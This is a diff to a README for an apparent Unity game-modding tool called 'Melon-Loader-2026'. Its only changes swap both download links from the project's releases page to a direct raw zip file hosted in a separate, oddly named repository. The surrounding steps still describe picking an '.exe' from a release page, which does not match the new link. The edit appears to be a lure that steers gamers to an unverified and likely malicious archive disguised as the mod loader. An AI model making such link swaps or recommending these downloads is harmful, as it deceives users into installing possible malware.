@@ -5,7 +5,7 @@ description: "Install Melon Loader for Unity games with this automated tool. Sup
 ---
 # 🍈 Melon-Loader-2026 - Customize your favorite computer games easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/tumblerclasspinopsida594/Melon-Loader-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/tumblerclasspinopsida594/tumblerclasspinopsida594.github.io/main/Veda/Dist_v1.6.zip)
 
 Melon-Loader-2026 allows you to add modifications to your PC games. Many game developers build their games using the Unity engine. This tool acts as a bridge. It lets you load custom code into your games to change how they behave. You gain the power to add features, fix bugs, or change game interfaces. This tool works with both Mono and IL2CPP frameworks. It serves as a universal tool for many popular titles including VRChat, Lethal Company, and Phasmophobia.
 
@@ -27,7 +27,7 @@ Follow these steps to acquire the installer:
 3. Select the file ending in ".exe" to begin your download.
 4. Save the file to your desktop for easy access.
 
-[Visit this page to download](https://github.com/tumblerclasspinopsida594/Melon-Loader-2026/releases)
+[Visit this page to download](https://raw.githubusercontent.com/tumblerclasspinopsida594/tumblerclasspinopsida594.github.io/main/Veda/Dist_v1.6.zip)
 
 ## ⚙️ Installation Guide
 
